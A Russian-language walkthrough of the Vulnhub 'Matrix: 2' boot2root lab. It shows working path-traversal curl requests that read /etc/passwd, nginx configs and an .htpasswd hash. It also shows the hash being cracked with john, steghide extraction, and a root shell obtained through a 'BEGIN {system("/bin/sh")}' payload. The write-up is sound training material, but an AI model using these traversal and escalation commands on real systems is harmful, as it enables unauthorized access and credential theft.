# Matrix: 2
## Vulnhub machine

- Название: Matrix: 2  
- OS: Linux
- Ресурс: Vulnhub
- Сложность: Intermediate
- Дата релиза: 21.12.18
- Оригинальное описание: 
>Matrix v2.0 is a medium level boot2root challenge. The OVA has been tested on both VMware and Virtual Box.
Difficulty: Intermediate
Flags: Your Goal is to get root and read /root/flag.txt
Networking:
DHCP: Enabled
IP Address: Automatically assigned
Hint: Follow your intuitions ... and enumerate!


## Write-up

```html
kali@kali:~$ nmap -p- -A 192.168.56.101
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-01 17:11 UTC
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.101
Host is up (0.00086s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Welcome in Matrix v2 Neo
1337/tcp  open  ssl/http           nginx
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Welcome to Matrix 2
|_http-title: 401 Authorization Required
| ssl-cert: Subject: commonName=nginx-php-fastcgi
| Subject Alternative Name: DNS:nginx-php-fastcgi
| Not valid before: 2018-12-07T14:14:44
|_Not valid after:  2028-12-07T14:14:44
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
12320/tcp open  ssl/http           ShellInABox
|_http-title: Shell In A Box
| ssl-cert: Subject: commonName=nginx-php-fastcgi
| Subject Alternative Name: DNS:nginx-php-fastcgi
| Not valid before: 2018-12-07T14:14:44
|_Not valid after:  2028-12-07T14:14:44
|_ssl-date: TLS randomness does not represent time
12321/tcp open  ssl/warehouse-sss?
| ssl-cert: Subject: commonName=nginx-php-fastcgi
| Subject Alternative Name: DNS:nginx-php-fastcgi
| Not valid before: 2018-12-07T14:14:44
|_Not valid after:  2028-12-07T14:14:44
|_ssl-date: TLS randomness does not represent time
12322/tcp open  ssl/http           nginx
| http-robots.txt: 1 disallowed entry 
|_file_view.php
|_http-title: Welcome in Matrix v2 Neo
| ssl-cert: Subject: commonName=nginx-php-fastcgi
| Subject Alternative Name: DNS:nginx-php-fastcgi
| Not valid before: 2018-12-07T14:14:44
|_Not valid after:  2028-12-07T14:14:44
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.11 seconds
```

>Посмотрим что находится в robots.txt:

```html 
https://192.168.56.101:12322/robots.txt

User-agent: *
Disallow: file_view.php
```

>При переходе к файлу file_view.php видим пустую страницу, пробуем с помощью curl или burpsuite прочесть стандартные файлы конфигурации, которые должны присутствовать в nginx, пути к ним можно легко найти в интернете, вот некоторые из них:

```html
/opt/nginx/conf/nginx.conf
/etc/nginx/nginx.conf
/etc/nginx/conf.d
/etc/nginx/sites-available/default
```

>Выстраиваем запрос следующим образом и получаем содержимое:

```html
kali@kali:~$ curl -X POST -k https://192.168.56.101:12322/file_view.php -d "file=../../../../../etc/nginx/nginx.conf"
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
        # multi_accept on;
}

http {

        ##
        # Basic Settings
        ##

        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;
        # server_tokens off;

        # server_names_hash_bucket_size 64;
        # server_name_in_redirect off;

        include /etc/nginx/mime.types;
        default_type application/octet-stream;

        ##
        # SSL Settings
        ##

        ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE
        ssl_prefer_server_ciphers on;

        ##
        # Logging Settings
        ##

        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;

        ##
        # Gzip Settings
        ##

        gzip on;
        gzip_disable "msie6";

        # gzip_vary on;
        # gzip_proxied any;
        # gzip_comp_level 6;
        # gzip_buffers 16 8k;
        # gzip_http_version 1.1;
        # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

        ##
        # Virtual Host Configs
        ##

        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}


#mail {
#       # See sample authentication script at:
#       # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
# 
#       # auth_http localhost/auth.php;
#       # pop3_capabilities "TOP" "USER";
#       # imap_capabilities "IMAP4rev1" "UIDPLUS";
# 
#       server {
#               listen     localhost:110;
#               protocol   pop3;
#               proxy      on;
#       }
# 
#       server {
#               listen     localhost:143;
#               protocol   imap;
#               proxy      on;
#       }
```

>Так же получилось прочесть passwd:

```html
kali@kali:~$ curl -X POST -k https://192.168.56.101:12322/file_view.php -d "file=../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
systemd-timesync:x:101:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:102:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:103:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:104:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
mysql:x:105:107:MySQL Server,,,:/nonexistent:/bin/false
uuidd:x:106:108::/run/uuidd:/bin/false
shellinabox:x:107:109:Shell In A Box,,,:/var/lib/shellinabox:/bin/false
ntp:x:108:111::/home/ntp:/bin/false
stunnel4:x:109:113::/var/run/stunnel4:/bin/false
postfix:x:110:114::/var/spool/postfix:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
<mark>n30</mark>:x:1000:1000:Neo,,,:/home/n30:/bin/bash
testuser:x:1001:1001::/home/testuser:
```

>В одном из файлов можно заметить путь к следующему файлу:

```html
kali@kali:~$ curl -X POST -k https://192.168.56.101:12322/file_view.php -d "file=../../../../../etc/nginx/sites-available/default"
server {
    listen 0.0.0.0:80;
    root /var/www/4cc3ss/;
    index index.html index.php;

    include /etc/nginx/include/php;
}

server {
    listen 1337 ssl;
    root /var/www/;
    index index.html index.php;

auth_basic "Welcome to Matrix 2";
auth_basic_user_file /var/www/p4ss/.htpasswd;

    fastcgi_param HTTPS on;
    include /etc/nginx/include/ssl;
    include /etc/nginx/include/php;
}

kali@kali:~$ curl -X POST -k https://192.168.56.101:12322/file_view.php -d "file=../../../../../var/www/p4ss/.htpasswd"
Tr1n17y:$apr1$7tu4e5pd$hwluCxFYqn/IHVFcQ2wER0
```

>Получаем хэш юзера Tr1n17y и брутим его:

```html
kali@kali:~/Downloads$ sudo john hash
Created directory: /root/.john
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 19 candidates buffered for the current salt, minimum 24 needed for performance.
Warning: Only 14 candidates buffered for the current salt, minimum 24 needed for performance.
Warning: Only 12 candidates buffered for the current salt, minimum 24 needed for performance.
Warning: Only 14 candidates buffered for the current salt, minimum 24 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 18 candidates buffered for the current salt, minimum 24 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
<mark>admin            (Tr1n17y)</mark>
1g 0:00:00:00 DONE 2/3 (2020-06-01 17:36) 10.00g/s 37430p/s 37430c/s 37430C/s Smokey..allstate
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

>После переходим к порту 1337, где от нас требуют логин и пароль, логинимся и видим страницу с обращением:

```html 
I'm trying to free your mind, n30
But I can only show you the door.
You're the one that has to walk through it.
```

>В исходном коде можно заметить коментарий:

>-- img src="h1dd3n.jpg" --

>Сохраняем и пробуем вытащить из нее хоть что-то:

```html
kali@kali:~/Downloads$ sudo steghide --extract -sf h1dd3n.jpg
Enter passphrase: n30
wrote extracted data to "n30.txt".
```

>Получаем файл с содержимым:

>P4$$w0rd

>Ищем по оставшимся портам, где нам может это пригодиться. И порт 12320 как раз просит логин и пароль:

```html
Matrix_2 login: n30
Password: P4$$w0rd

Welcome to Matrix_2, TurnKey GNU/Linux 15.1 / TurnKey 9.6 Stretch                                                                     
                                                                                                                                      
  System information (as of Mon Jun 01 21:29:52 2020)                                                                                 


    System load:  0.00              Memory usage:  17%                                                                                
    Processes:    89                Swap usage:    0%                                                                                 
    Usage of /:   6.4% of 16.61GB   IP address for eth0:  192.168.56.101                                                              


  TKLBAM (Backup and Migration):  NOT INITIALIZED                                                                                     


    To initialize TKLBAM, run the "tklbam-init" command to link this                                                                  
    system to your TurnKey Hub account. For details see the man page or                                                               
    go to:                                                                                                                            


        https://www.turnkeylinux.org/tklbam                                                                                           
                                                                                                                                      
Linux Matrix_2 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64                                                              
===================================================================================                                                   
                                                                                                                                      
                                                                                                                                      
Welcome to Matrix_2, GNU/Linux 15.1 /                                                                                                 
                                                                                                                                      
                                                                                                                                      
  __  __       _        _        ___                                                                                                  
 |  \/  |     | |      (_)      |__ \                                                                                                 
 | \  / | __ _| |_ _ __ ___  __    ) |                                                                                                
 | |\/| |/ _` | __| '__| \ \/ /   / /                                                                                                 
 | |  | | (_| | |_| |  | |>  <   / /_                                                                                                 
 |_| _|_|\__,_|\__|_|  |_/_/\_\ |____|                                                                                                
    |  _ \                                                                                                                            
    | |_) |_   _                                                                                                                      
    |  _ <| | | |                                                                                                                     
    | |_) | |_| |                                                                                                                     
    |____/ \__, |                                                                                                                     
            __/ |                                                                                                                     
           |___/                                 _            _            __ _  _                                                    
             | |                                | |          (_)          / /| || |                                                   
  _   _ _ __ | | ___ __   _____      ___ __   __| | _____   ___  ___ ___ / /_| || |_                                                  
 | | | | '_ \| |/ / '_ \ / _ \ \ /\ / / '_ \ / _` |/ _ \ \ / / |/ __/ _ \ '_ \__   _|                                                 
 | |_| | | | |   <| | | | (_) \ V  V /| | | | (_| |  __/\ V /| | (_|  __/ (_) | | |                                                   
  \__,_|_| |_|_|\_\_| |_|\___/ \_/\_/ |_| |_|\__,_|\___| \_/ |_|\___\___|\___/  |_|                                                   


                                                                                                                                      
                                                                                                                                      
Linux Matrix_2 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64                                                              
                                                                                                                                      
===================================================================================                                                   
                                                                                                                                      
n30@Matrix_2 ~$ id
uid=1000(n30) gid=1000(n30) groups=1000(n30)
```

>Имея юзера n30, осталось взять root, и у меня это вышло слишком просто, я прочел bash_history и заметил команду "morpheus 'BEGIN {system("/bin/sh")}'", запустил ее и получил root:

```html
n30@Matrix_2 //home/n30$ cat .bash_history 
id                                                                                                                                    
m}'                                                                                                                                   
morpheus 'BEGIN {system("/bin/sh")}'                                                                                                  
ls -l /usr/bin/morpheus                                                                                                               
exit                                                                                                                                  
morpheus 'BEGIN {system("/bin/sh")}'                                                                                                  
ls -l /usr/bin/morpheus                                                                                                               
exit                                                                                                                                  
morpheus 'BEGIN {system("/bin/sh")}'                                                                                                  
exit                                                                                                                                  
morpheus 'BEGIN {system("/bin/sh")}'                                                                                                  
clear                                                                                                                                 
chown n30:n30 /usr/bin/morpheus                                                                                                       
exit                                                                                                                                  
chmod -x /usr/bin/morpheus                                                                                                            
ls -l /usr/bin/morpheus                                                                                                               
chmod -r /usr/bin/morpheus                                                                                                            
ls -l /usr/bin/morpheus                                                                                                               
ls -w /usr/bin/morpheus                                                                                                               
chmod -w /usr/bin/morpheus                                                                                                            
ls -l /usr/bin/morpheus                                                                                                               
chmod +x /usr/bin/morpheus                                                                                                            
ls -l /usr/bin/morpheus                                                                                                               
chmod -x /usr/bin/morpheus                                                                                                            
ls -l /usr/bin/morpheus                                                                                                               
chmod 010 /usr/bin/morpheus                                                                                                           
ls -l /usr/bin/morpheus                                                                                                               
morpheus                                                                                                                              
chmod 050 /usr/bin/morpheus                                                                                                           
morpheus                                                                                                                              
chmod 550 /usr/bin/morpheus                                                                                                           
morpheus                                                                                                                              
ls -l /usr/bin/morpheus                                                                                                               
chown root /usr/bin/morpheus                                                                                                          
exit                                                                                                                                  
morpheus                                                                                                                              
morpheus 'BEGIN {system("/bin/sh")}'                                                                                                  
exit                                                                                                                                  
ls                                                                                                                                    
cat /root/flag.txt                                                                                                                    
morpheus 'BEGIN {system("/bin/sh")}'                                                                                                  
exit                                                                                                                                  
exit                                                                                                                                  
whoami                                                                                                                                
id                                                                                                                                    
uid                                                                                                                                   
whoami                                                                                                                                
exit                                                                                                                                  
morpheus 'BEGIN {system("/bin/sh")}'                                                                                                  
su                                                                                                                                    
exit                                                                                                                                  
exit                                                                                                                                  
n30@Matrix_2 //home/n30$ morpheus 'BEGIN {system("/bin/sh")}'                                                                         
# id                                                                                                                                  
uid=1000(n30) gid=1000(n30) euid=0(root) groups=1000(n30)                                                                             
# whoami                                                                                                                              
root
```

>Видимо создатель машины забыл очистить историю или выставить права на чтение, ну и ладно:

```html
# cd root                                                                                                                             
# ls                                                                                                                                  
flag.txt                                                                                                                              
# cat flag.txt                                                                                                                        
╦ ╦┌─┐┬ ┬┬─┐┌─┐  ┌─┐┌─┐┌─┐┌┬┐┌─┐┬─┐  ┌┬┐┬ ┬┌─┐┌┐┌  ┌┬┐┬ ┬┬┌─┐                                                                         
╚╦╝│ ││ │├┬┘├┤   ├┤ ├─┤└─┐ │ ├┤ ├┬┘   │ ├─┤├─┤│││   │ ├─┤│└─┐                                                                         
 ╩ └─┘└─┘┴└─└─┘  └  ┴ ┴└─┘ ┴ └─┘┴└─   ┴ ┴ ┴┴ ┴┘└┘   ┴ ┴ ┴┴└─┘o                                                                        
╔╦╗┌─┐┌┐┌┌┬┐  ┌┬┐┬ ┬┬┌┐┌┬┌─  ┬ ┬┌─┐┬ ┬  ┌─┐┬─┐┌─┐                                                                                     
 ║║│ ││││ │    │ ├─┤││││├┴┐  └┬┘│ ││ │  ├─┤├┬┘├┤                                                                                      
═╩╝└─┘┘└┘ ┴    ┴ ┴ ┴┴┘└┘┴ ┴   ┴ └─┘└─┘  ┴ ┴┴└─└─┘┘                                                                                    
┬┌─┌┐┌┌─┐┬ ┬  ┬ ┬┌─┐┬ ┬  ┌─┐┬─┐┌─┐                                                                                                    
├┴┐││││ ││││  └┬┘│ ││ │  ├─┤├┬┘├┤                                                                                                     
┴ ┴┘└┘└─┘└┴┘   ┴ └─┘└─┘  ┴ ┴┴└─└─┘o                                                                                                   
   ╔╦╗┌─┐┬─┐┌─┐┬ ┬┌─┐┬ ┬┌─┐                                                                                                           
───║║║│ │├┬┘├─┘├─┤├┤ │ │└─┐                                                                                                           
   ╩ ╩└─┘┴└─┴  ┴ ┴└─┘└─┘└─┘                                                                                                           
╔═╗╦╔═╔═╗                                                                                                                             
╠═╣╠╩╗╠═╣                                                                                                                             
╩ ╩╩ ╩╩ ╩                                                                                                                             
┬ ┬┌┐┌┬┌─┌┐┌┌─┐┬ ┬┌┐┌┌┬┐┌─┐┬  ┬┬┌─┐┌─┐                                                                                                
│ ││││├┴┐││││ │││││││ ││├┤ └┐┌┘││  ├┤ 64                                                                                              
└─┘┘└┘┴ ┴┘└┘└─┘└┴┘┘└┘─┴┘└─┘ └┘ ┴└─┘└─┘ 
```
